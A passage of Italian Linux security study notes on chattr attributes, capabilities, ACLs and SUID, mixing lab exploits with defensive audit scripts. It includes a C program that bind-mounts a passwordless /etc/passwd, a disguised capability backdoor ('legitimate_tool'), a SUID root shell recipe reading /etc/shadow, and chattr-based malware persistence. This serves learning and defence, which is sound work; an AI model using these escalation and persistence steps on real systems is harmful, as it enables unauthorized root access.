# Linux Security

Documentazione completa su permessi avanzati Linux, capabilities, ACL e tecniche di hardening. Include exploit sviluppati e tecniche di bypassing testate in ambiente controllato.

## Indice

- [Permessi Speciali](#permessi-speciali)
- [Linux Capabilities](#linux-capabilities)
- [Access Control Lists](#access-control-lists)
- [Exploit CAP_SYS_ADMIN](#exploit-cap_sys_admin)
- [Best Practices](#best-practices)

## Permessi Speciali

### chattr - Change Attributes

Il comando `chattr` permette di impostare attributi speciali sui file che vanno oltre i permessi Unix tradizionali.

#### Attributo Immutable (+i)

**Funzionalità**:
- Rende un file completamente immutabile
- Nemmeno root può modificare il file
- Utile per proteggere file critici di sistema

```bash
# Rendere file completamente immutabile
sudo chattr +i critical_file.txt

# Verifica attributi
lsattr critical_file.txt
# Output: ----i----------------m critical_file.txt

# Test modifica (fallisce anche con sudo)
echo "nuovo contenuto" > critical_file.txt
# zsh: operazione non permessa: critical_file.txt

# Anche con sudo fallisce
sudo echo "content" > critical_file.txt
# zsh: operazione non permessa: critical_file.txt

# Rimozione attributo (solo questo funziona)
sudo chattr -i critical_file.txt
```

#### Attributo Append-Only (+a)

**Funzionalità**:
- Permette solo aggiunta di contenuto
- Impedisce modifica/cancellazione
- Ideale per file di log

```bash
# Modalità solo aggiunta
sudo chattr +a /var/log/security.log

# Aggiunta permessa
echo "evento sicurezza $(date)" >> /var/log/security.log

# Modifica negata
echo "sovrascrittura" > /var/log/security.log  # Permission denied

# Cancellazione negata
rm /var/log/security.log  # Permission denied
truncate -s 0 /var/log/security.log  # Permission denied
```

#### Paradosso +ai (Append + Immutable)

**Test condotto**:
```bash
# Applicazione entrambi gli attributi
sudo chattr +ai test_file.txt

# Risultato: +i prevale su +a
# File diventa completamente immutabile
# Nessuna operazione permessa (nemmeno append)

# Soluzione: rimuovere +i prima
sudo chattr -i test_file.txt
# Ora +a funziona correttamente
```

**Conclusione**: `+i` (immutable) ha precedenza su `+a` (append).

### Limitazioni Filesystem

#### btrfs - Secure Deletion Non Supportata

**Test filesystem**:
```bash
$ df -T .
File system    Tipo  1K-blocchi     Usati Disponib. Uso% Montato su
/dev/nvme0n1p2 btrfs  976453300 124420820 850999292  13% /home

$ chattr +s secure_file.txt
chattr: Operazione non supportata impostando i flag di secure_file.txt
```

**Conclusione**: btrfs NON supporta l'attributo `+s` (secure deletion).

**Filesystem supportati per +s**:
- ext2, ext3, ext4
- Non supportato: btrfs, xfs, zfs

### Implicazioni di Sicurezza

#### Uso Difensivo

```bash
# Protezione log di autenticazione
sudo chattr +a /var/log/auth.log

# Protezione configurazione critica
sudo chattr +i /etc/passwd
sudo chattr +i /etc/shadow
sudo chattr +i /etc/sudoers
```

**Vantaggi**:
- Previene cancellazione accidentale
- Blocca attaccanti dalla modifica
- Mantiene integrità log

#### Uso Offensivo

```bash
# Malware persistente (scenario di test)
sudo chattr +i /tmp/malware.log
sudo chattr +a /tmp/backdoor.sh
```

**Rischi**:
- Malware difficile da rimuovere
- Riempimento disco (DoS)
- Persistenza avanzata

#### ⚠️ Problema Critico Identificato

**Scenario**: `chattr +i` su file di log blocca anche daemon legittimi.

**Test SSH**:
```bash
# Applicazione +i su auth.log
sudo chattr +i /var/log/auth.log

# Risultato: sshd non può più scrivere log
# Gli accessi non vengono registrati
# BLINDNESS COMPLETA per monitoring
```

**Impatto**: Perdita visibilità su accessi SSH → Security gap critico.

## Linux Capabilities

### Concetti Base

Le Linux Capabilities dividono i privilegi di root in unità atomiche, sostituendo il modello SUID "tutto-o-niente".

**Vantaggi**:
- Sicurezza granulare
- Principio del minimo privilegio
- Riduzione superficie di attacco

#### Verifica Capabilities Esistenti

```bash
# Controllo capabilities su binari comuni
getcap /usr/bin/ping
# (nessun output = nessuna capability)

getcap /usr/bin/traceroute
# (nessun output)

# Controllo permessi tradizionali
ls -al /usr/bin/ping
# -rwxr-xr-x 1 root root 155160  5 giu 21.01 /usr/bin/ping
```

**Osservazione**: Su sistemi moderni, molti binari usano capabilities invece di SUID.

### Test Pratico con CAP_NET_RAW

#### Setup Test Environment

```bash
# Creazione copia per testing
cp /usr/bin/ping /tmp/test_ping

# Assegnazione capability
sudo setcap cap_net_raw+ep /tmp/test_ping

# Verifica capability assegnata
getcap /tmp/test_ping
# /tmp/test_ping cap_net_raw=ep

# Test funzionalità
/tmp/test_ping 8.8.8.8
# PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
# 64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=15.2 ms
```

#### Significato Flag Capabilities

**Format**: `cap_name=flags`

**Flag disponibili**:
- `e` = **Effective** (attiva quando il processo parte)
- `p` = **Permitted** (permessa per questo file)
- `i` = **Inheritable** (ereditabile da processi figli)

**cap_net_raw**: 
- Raw socket access
- Necessario per ICMP ping
- Packet crafting
- Network sniffing

#### Confronto SUID vs Capabilities

| SUID | Capabilities |
|------|-------------|
| Tutto-o-niente | Granulare |
| Root completo | Solo necessario |
| Rischio alto | Rischio ridotto |
| Legacy | Moderno |

### Capabilities Pericolose

#### CAP_SYS_ADMIN - "Almost Root"

**Permessi inclusi**:
- Mount/unmount filesystem
- Creazione device nodes
- Amministrazione namespace
- Modifica kernel parameters
- Controllo swap
- Operazioni quotas

**Praticamente equivale a root!**

#### Test CAP_SYS_ADMIN

```bash
# Creazione binario di test
cp /bin/bash /tmp/test_sys_admin

# Assegnazione capability pericolosa
sudo setcap cap_sys_admin+ep /tmp/test_sys_admin

# Verifica
getcap /tmp/test_sys_admin
# /tmp/test_sys_admin cap_sys_admin=ep
```

**⚠️ Problema**: Le shell non preservano capabilities quando lanciate.

**Soluzione**: Binario compilato che mantiene capabilities.

### Lista Capabilities Critiche

| Capability | Rischio | Descrizione |
|------------|---------|-------------|
| CAP_SYS_ADMIN | 🔴 Critico | Quasi tutti i privilegi root |
| CAP_SYS_PTRACE | 🔴 Critico | Debug/inject altri processi |
| CAP_SYS_MODULE | 🔴 Critico | Caricare moduli kernel |
| CAP_DAC_OVERRIDE | 🟡 Alto | Bypass controlli file |
| CAP_SETUID | 🟡 Alto | Cambiare UID processi |
| CAP_NET_ADMIN | 🟡 Alto | Amministrazione rete |
| CAP_NET_RAW | 🟢 Medio | Raw socket (sniffing) |

## Access Control Lists

### Introduzione ACL

Gli ACL (Access Control Lists) estendono il modello Unix tradizionale permettendo controllo granulare per utenti e gruppi multipli.

**Vantaggi**:
- Permessi specifici senza cambiare proprietà
- Controllo fine su utenti/gruppi multipli
- Ereditarietà configurabile
- Aggiunta/rimozione dinamica permessi

#### Visualizzazione ACL Base

```bash
# Visualizzare ACL di un file
getfacl file.txt
```

**Output tipico**:
```
# file: file.txt
# owner: todd
# group: todd
user::rw-
group::rw-
other::r--
```

**Equivalenza**: Stessi permessi di `ls -al` ma formato ACL.

#### ACL per Directory

```bash
# ACL ricorsivo per directory
getfacl -R Documents/
```

### Setup Multi-User Testing

#### Creazione Ambiente Test

```bash
# Creazione utenti test
sudo adduser mario
sudo adduser giulia
sudo adduser todd

# Creazione gruppi funzionali
sudo groupadd dev
sudo groupadd HR
sudo groupadd finance

# Assegnazione utenti a gruppi
sudo usermod -aG dev mario
sudo usermod -aG HR giulia
sudo usermod -aG finance todd
```

#### Configurazione ACL Granulare

```bash
# Permessi specifici per utente
setfacl -m u:mario:rw file.txt

# Permessi per gruppo
setfacl -m g:dev:rwx project/

# Negazione esplicita (importante!)
setfacl -m u:giulia:--- sensitive_data.txt

# ACL predefinite per nuovi file
setfacl -d -m g:dev:rw project/
```

#### Test Pratico Permessi

**Setup file con permessi zero**:
```bash
# Rimozione tutti i permessi Unix
chmod 000 test_file.txt

# ACL per dare accesso specifico
setfacl -m u:mario:rx test_file.txt

# Verifica
ls -al test_file.txt
# ----rwx---+ 1 todd todd 28 17 lug 00.08 test_file.txt
#          ^ Il '+' indica presenza ACL
```

**Test accesso**:
```bash
# Come mario (dovrebbe funzionare)
su mario
./test_file.txt  # ✅ Successo

# Come giulia (dovrebbe fallire)
su giulia  
./test_file.txt  # ❌ Permission denied
```

### ⚠️ Regola Fondamentale ACL

**ACL NON può sovrascrivere permessi Unix base**.

**Esempio problema**:
```bash
# Directory con permessi 000
chmod 000 project/
setfacl -m g:dev:rwx project/

# Test accesso (FALLISCE)
cd project/  # Permission denied
```

**Soluzione**:
```bash
# Permessi Unix minimi necessari
chmod 770 project/  # rwx per owner e group
setfacl -m g:dev:rwx project/

# Ora funziona
cd project/  # ✅ Successo
```

### Soluzione Definitiva al Problema chattr +i

#### Problema Identificato

`chattr +i` su `/var/log/auth.log` blocca anche daemon SSH legittimi:
- sshd non può scrivere log
- Perdita visibilità accessi
- Security monitoring compromesso

#### Soluzione con ACL

```bash
# 1. Setup ownership corretto
sudo chown syslog:adm /var/log/auth.log

# 2. Permessi base appropriati
sudo chmod 640 /var/log/auth.log

# 3. ACL per bloccare utenti specifici
sudo setfacl -m u:attacker:--- /var/log/auth.log
sudo setfacl -m u:suspicious:--- /var/log/auth.log
sudo setfacl -m u:guest:--- /var/log/auth.log

# 4. Verifica configurazione
getfacl /var/log/auth.log
```

**Risultato**:
- ✅ Daemon syslog può scrivere
- ✅ Utenti autorizzati possono leggere
- ✅ Utenti non autorizzati bloccati
- ✅ Security monitoring funzionante

#### Test Validazione

```bash
# Test come syslog (dovrebbe funzionare)
su syslog
echo "test log entry" >> /var/log/auth.log  # ✅

# Test come attacker (dovrebbe fallire)
su attacker
cat /var/log/auth.log  # ❌ Permission denied
echo "malicious" >> /var/log/auth.log  # ❌ Permission denied
```

## Exploit CAP_SYS_ADMIN

### Exploit Development

#### Problema Shell Non Preserve Capabilities

```bash
# Test con shell (FALLISCE)
sudo setcap cap_sys_admin+ep /bin/bash
/bin/bash
# Capabilities non mantenute nella nuova shell
```

**Soluzione**: Binario compilato dedicato.

#### Exploit Tipo 1 - Mount Test

```c
// File: cap_test.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/capability.h>

int main() {
    printf("=== CAP_SYS_ADMIN Test Program ===\n");
    printf("UID: %d, EUID: %d\n", getuid(), geteuid());
    
    // Mostra capabilities correnti
    cap_t caps = cap_get_proc();
    if (caps) {
        char *cap_string = cap_to_text(caps, NULL);
        printf("Current capabilities: %s\n", cap_string);
        cap_free(cap_string);
        cap_free(caps);
    }
    
    // Test mount operation
    printf("Testing mount...\n");
    if (mount("tmpfs", "/tmp/test_simple", "tmpfs", 0, NULL) == 0) {
        printf("✅ SUCCESS: Mount worked!\n");
        umount("/tmp/test_simple");
    } else {
        perror("❌ FAILED: Mount failed");
    }
    
    return 0;
}
```

**Compilazione e test**:
```bash
# Compilazione
gcc -o /tmp/cap_test /tmp/cap_test.c -lcap

# Assegnazione capability
sudo setcap cap_sys_admin+ep /tmp/cap_test

# Verifica capability
getcap /tmp/cap_test
# /tmp/cap_test cap_sys_admin=ep

# Esecuzione exploit
/tmp/cap_test
```

**Output**:
```
=== CAP_SYS_ADMIN Test Program ===
UID: 1000, EUID: 1000
Current capabilities: cap_wake_alarm=i cap_sys_admin+ep
Testing mount...
✅ SUCCESS: Mount worked!
```

**Analisi**: Mount operation successful con UID 1000 (utente normale)!

#### Exploit Tipo 2 - Passwd Hijacking Attempt

```c
// File: complete_exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main() {
    printf("=== COMPLETE CAP_SYS_ADMIN EXPLOIT ===\n");
    printf("Current user: UID %d (not root!)\n", getuid());
    
    // Step 1: Create fake passwd
    printf("\n1. Creating fake /etc/passwd...\n");
    system("mkdir -p /tmp/fake_etc");
    system("echo 'root::0:0:root:/root:/bin/bash' > /tmp/fake_etc/passwd");
    
    printf("Fake passwd content:\n");
    system("cat /tmp/fake_etc/passwd");
    
    // Step 2: Show original passwd
    printf("\n2. Original /etc/passwd (first line):\n");
    system("head -1 /etc/passwd");
    
    // Step 3: Bind mount attack
    printf("\n3. Performing bind mount attack...\n");
    if (mount("/tmp/fake_etc/passwd", "/etc/passwd", NULL, MS_BIND, NULL) == 0) {
        printf("✅ SUCCESS: /etc/passwd replaced!\n");
        
        printf("\n4. New /etc/passwd content:\n");
        system("head -1 /etc/passwd");
        
        printf("\n🎯 ROOT ACCESS ACHIEVED!\n");
        printf("You can now: su root (no password needed)\n");
        
        printf("\nPress Enter to restore system...");
        getchar();
        
        // Cleanup
        umount("/etc/passwd");
        printf("✅ System restored.\n");
    } else {
        perror("❌ Bind mount failed");
    }
    
    system("rm -rf /tmp/fake_etc");
    return 0;
}
```

**Test exploit**:
```bash
# Compilazione
gcc -o /tmp/complete_exploit /tmp/complete_exploit.c

# Capability assignment
sudo setcap cap_sys_admin+ep /tmp/complete_exploit

# Esecuzione
/tmp/complete_exploit
```

**Risultato**:
```
✅ SUCCESS: /etc/passwd replaced!
New /etc/passwd content:
root::0:0:root:/root:/bin/bash

🎯 ROOT ACCESS ACHIEVED!
You can now: su root (no password needed)
```

**Test finale**:
```bash
# Tentativo accesso root
su root
# Password: (premere solo Enter)
# su: Authentication failure
```

### 🛡️ Defense in Depth Discovery

**Exploit fallito nonostante mount successful!**

**Investigazione**: Perché `su root` fallisce anche con passwd hijackato?

**Scoperta cruciale**: I sistemi Linux moderni hanno **multiple linee di difesa**:

1. **File system** (/etc/passwd, /etc/shadow)
2. **PAM** (Pluggable Authentication Modules)
3. **NSS** (Name Service Switch)
4. **systemd** user management
5. **Security modules** (AppArmor, SELinux)

#### Analisi PAM Configuration

```bash
# Controllo configurazione PAM per su
cat /etc/pam.d/su
```

**Output tipico**:
```
auth       sufficient pam_rootok.so
auth       required   pam_unix.so
account    required   pam_unix.so
session    required   pam_unix.so
```

**Conclusione**: PAM usa multiple verifiche oltre a `/etc/passwd`.

#### Lezioni Apprese

1. **Exploit "old school"** (mount bind) non bastano più
2. **Sistemi moderni** sono hardened contro attacchi classici
3. **CAP_SYS_ADMIN** rimane pericolosa ma serve conoscenza profonda
4. **Defense in depth** funziona efficacemente

## Best Practices

### Per Blue Team

#### Monitoring Capabilities

```bash
# Script per audit capabilities
#!/bin/bash
echo "=== DANGEROUS CAPABILITIES AUDIT ==="
find /usr/bin /usr/sbin /bin /sbin -type f -exec getcap {} \; 2>/dev/null | while read file caps; do
    case "$caps" in
        *cap_sys_admin*|*cap_sys_ptrace*|*cap_sys_module*)
            echo "🔴 CRITICAL: $file $caps"
            ;;
        *cap_dac_override*|*cap_setuid*)
            echo "🟡 HIGH: $file $caps"
            ;;
        *)
            echo "🟢 INFO: $file $caps"
            ;;
    esac
done
```

#### ACL Security Guidelines

```bash
# Template sicuro per log protection
setup_secure_logs() {
    local logfile=$1
    
    # Ownership corretto
    sudo chown syslog:adm "$logfile"
    
    # Permessi base
    sudo chmod 640 "$logfile"
    
    # ACL per negare accesso utenti rischiosi
    sudo setfacl -m u:guest:--- "$logfile"
    sudo setfacl -m u:nobody:--- "$logfile"
    
    echo "✅ Secured: $logfile"
}

# Uso
setup_secure_logs /var/log/auth.log
setup_secure_logs /var/log/secure
```

### Per Red Team

#### Capability Exploitation

```bash
# Enumerazione capabilities
find / -type f -exec getcap {} \; 2>/dev/null | grep -v '^$'

# Focus su capabilities pericolose
getcap -r / 2>/dev/null | grep -E "(sys_admin|sys_ptrace|sys_module)"

# Test capability assignment (se privilegi admin)
cp /bin/bash /tmp/test
setcap cap_sys_admin+ep /tmp/test
```

#### Persistence via Capabilities

```bash
# Backdoor con capability (richiede admin)
cp /bin/bash /usr/local/bin/legitimate_tool
setcap cap_sys_admin+ep /usr/local/bin/legitimate_tool

# Apparentemente legittimo ma con privilegi elevati
# Difficile da individuare in audit superficiali
```

### Per System Administrators

#### Hardening Checklist

```bash
# 1. Audit capabilities esistenti
getcap -r / 2>/dev/null > capabilities_audit.txt

# 2. Rimozione capabilities non necessarie
# Esempio: se ping non serve raw socket
sudo setcap -r /usr/bin/ping

# 3. Monitoring modifiche capabilities
# Aggiungere a script di monitoring:
# find /usr/bin -newer /var/log/last_audit -exec getcap {} \;

# 4. ACL invece di chattr per log
# NON: sudo chattr +i /var/log/auth.log
# SÌ:  setup ACL appropriati

# 5. Regular capability audit
echo "0 2 * * * root getcap -r / > /var/log/capabilities_daily.log" | sudo tee -a /etc/crontab
```

#### Emergency Response

```bash
# Rimozione capability sospetta
sudo setcap -r /path/to/suspicious/binary

# Reset ACL su file critici
sudo setfacl -b /etc/passwd
sudo setfacl -b /etc/shadow

# Audit modifiche recenti
find /usr/bin /usr/sbin -type f -newer /var/log/lastaudit -exec getcap {} \;
```

---

**Conclusioni Linux Security**:
- Capabilities offrono sicurezza granulare ma richiedono competenza
- ACL migliori di chattr per la maggior parte dei casi d'uso
- Defense in depth efficace contro exploit classici
- Monitoring proattivo essenziale per individuare abusi
## 🔐 SUID/SGID Deep Dive & Exploitation

### Ricognizione Sistema SUID/SGID
```bash
# Trova tutti i binari SUID/SGID nel sistema
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null > /tmp/suid_sgid_full.txt

# Spiegazione comando:
# / = cerca dalla root
# -type f = solo file normali
# -perm -4000 = file SUID (Set User ID)
# -perm -2000 = file SGID (Set Group ID)
# \( \) = raggruppamento con escape
# -o = OR logico
# 2>/dev/null = nasconde errori di permesso
```

### Analisi Output SUID/SGID
```bash
# Esempio output tipico:
-rwsr-xr-x 1 root root 47512  8 apr  2024 /usr/bin/crontab
-rwsr-xr-x 1 root root 34944 12 lug  2024 /usr/bin/fusermount
-rwsr-sr-x 1 root root 22560  7 set  2024 /usr/bin/mount.ecryptfs_private
-rwsr-xr-x 1 root root 64272 27 giu 09.35 /usr/bin/chage
-rwsr-xr-x 1 root root 80856 27 giu 09.35 /usr/bin/passwd
-rwsr-xr-x 1 root root 55384 24 giu 12.45 /usr/bin/su
-rwsr-xr-x 1 root root 257136 30 giu 18.25 /usr/bin/sudo

# Breakdown di una riga:
# -rwsr-xr-x = permessi (s = SUID attivo)
# 1 = numero hard link
# root root = owner e group
# 47512 = dimensione in byte
# data = ultima modifica
# path = percorso assoluto
```

### File SUID Legittimi vs Sospetti

**✅ File SUID Legittimi (standard sistema):**
- `/usr/bin/passwd` - Cambio password utenti
- `/usr/bin/sudo` - Escalation privilegi controllata  
- `/usr/bin/su` - Switch user
- `/usr/bin/mount/umount` - Montaggio filesystem
- `/usr/bin/chage` - Gestione scadenza password

**⚠️ File SUID Potenzialmente Pericolosi:**
- `/usr/lib/chromium/chrome-sandbox` - Vulnerabile in versioni pre-2016
- `/usr/lib/dbus-daemon-launch-helper` - Problemi in vecchie versioni
- `/usr/bin/fusermount/fusermount3` - FUSE filesystem mounting
- `/usr/lib/virtualbox/VBox*` - VirtualBox (potenziali vulnerabilità)

**🚨 Path ALTAMENTE Sospetti:**
- `/tmp/*` con SUID = 🚩 PROBABILE MALWARE
- `/var/tmp/*` con SUID = 🚩 BACKDOOR POSSIBILE
- File SUID in directory scrivibili da tutti = PERICOLO

### Exploit SUID Simulation (SOLO LABORATORIO)

#### Creazione Shell SUID Root
```bash
# ⚠️ ATTENZIONE: Solo per scopi didattici in ambiente isolato

# 1. Copia bash in /tmp
cp /bin/bash /tmp/rootshell

# 2. Cambia ownership a root (richiede sudo)
sudo chown root:root /tmp/rootshell

# 3. Imposta SUID bit
sudo chmod +s /tmp/rootshell

# 4. Verifica permessi
ls -la /tmp/rootshell
# Output: -rwsr-sr-x 1 root root 1100536 19 lug 11.59 /tmp/rootshell
```

#### Esecuzione Privilege Escalation
```bash
# Esegui shell con privilegi
/tmp/rootshell -p

# Verifica escalation
id
# Output: uid=1000(user) gid=1000(user) euid=0(root)

# Test accesso root
cd /root  # Accesso directory root
whoami    # Dovrebbe mostrare root capabilities
cat /etc/shadow  # Lettura file riservati
```

#### Cleanup Obbligatorio
```bash
# ✅ RIMUOVI SEMPRE dopo il test
sudo rm -f /tmp/rootshell

# Verifica rimozione
ls -la /tmp/rootshell
# Dovrebbe dare: No such file or directory
```

### Difesa contro SUID Abuse

#### Monitor Automatico SUID Sospetti
```bash
#!/bin/bash
# Script: suid_monitor.sh

echo "🔍 Scanning for suspicious SUID files..."

# Check temporanee directories
find /tmp /var/tmp -type f -perm -4000 2>/dev/null | while read file; do
    echo "🚨 SUID SOSPETTO IN TEMP: $file"
    ls -la "$file"
    echo "  Owner: $(stat -c '%U:%G' "$file")"
    echo "  Created: $(stat -c '%y' "$file")"
    echo "---"
done

# Check for unusual SUID locations
find /home -type f -perm -4000 2>/dev/null | while read file; do
    echo "⚠️ SUID IN HOME DIRECTORY: $file"
    ls -la "$file"
done

echo "✅ Scan completato"
```

#### Baseline SUID Monitoring
```bash
# Crea baseline dei file SUID legittimi
find / -type f -perm -4000 2>/dev/null | sort > /etc/suid_baseline.txt

# Script di controllo periodico
#!/bin/bash
find / -type f -perm -4000 2>/dev/null | sort > /tmp/suid_current.txt
diff /etc/suid_baseline.txt /tmp/suid_current.txt

if [ $? -ne 0 ]; then
    echo "🚨 NUOVI FILE SUID RILEVATI!"
    echo "Differenze:"
    diff /etc/suid_baseline.txt /tmp/suid_current.txt
else
    echo "✅ Nessun nuovo file SUID"
fi
```

#### Hardening SUID
```bash
# Rimuovi SUID bit non necessari
sudo chmod -s /usr/bin/binary_non_necessario

# Audit permessi speciali
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null | 
grep -v -E "(passwd|sudo|su|mount|umount|ping)" | 
tee /tmp/unusual_suid.txt

echo "File SUID/SGID inusuali salvati in /tmp/unusual_suid.txt"
```

### Implicazioni di Sicurezza Reali

#### Perché SUID è Pericoloso
1. **Escalation Immediata**: Da user normale a root in un comando
2. **Persistenza**: File rimane finché non rimosso manualmente  
3. **Invisibilità**: Non appare nei processi normali
4. **Bypass Controls**: Evita molti sistemi di monitoring

#### Scenari di Attacco Reali
- **Malware Drop**: Dropper crea shell SUID in /tmp
- **Privilege Escalation**: Exploit vulnerability → drop SUID shell
- **Persistence Mechanism**: Shell SUID come backdoor permanente
- **Container Escape**: SUID per uscire da container compromesso

#### Lezione Importante
> La scoperta cruciale è che i sistemi Linux moderni hanno **multiple linee di difesa**:
> 1. File system permissions (/etc/passwd, /etc/shadow)
> 2. PAM (Pluggable Authentication Modules)  
> 3. NSS (Name Service Switch)
> 4. Systemd user management
> 
> Un exploit "vecchia scuola" spesso non basta più, ma **SUID rimane un vettore di attacco potente** se sfruttato correttamente.
[← Torna al Main](../../README.md) | [Networking →](../networking/README.md)
